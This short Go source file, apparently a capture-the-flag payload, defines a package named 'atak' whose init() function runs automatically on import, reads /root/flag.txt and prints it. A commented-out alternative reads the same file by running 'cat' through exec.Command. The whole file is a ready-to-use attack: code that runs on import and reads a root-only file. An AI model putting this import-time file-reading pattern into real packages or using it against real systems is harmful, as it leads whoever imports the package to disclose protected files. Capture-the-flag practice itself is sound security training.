
package atak

import (
	"fmt"
	"io/ioutil"
)

func init() {
	data, err := ioutil.ReadFile("/root/flag.txt")
	if err != nil {
		fmt.Println("Error:", err)
		return
	}
	fmt.Println("FLAG:", string(data))
}

// import (
//     "os/exec"
//     "fmt"
// )

// func main() {
//     out, err := exec.Command("cat", "/root/flag.txt").Output()
//     if err != nil {
//         fmt.Println("Error:", err)
//         return
//     }
//     fmt.Println("FLAG:", string(out))
// }
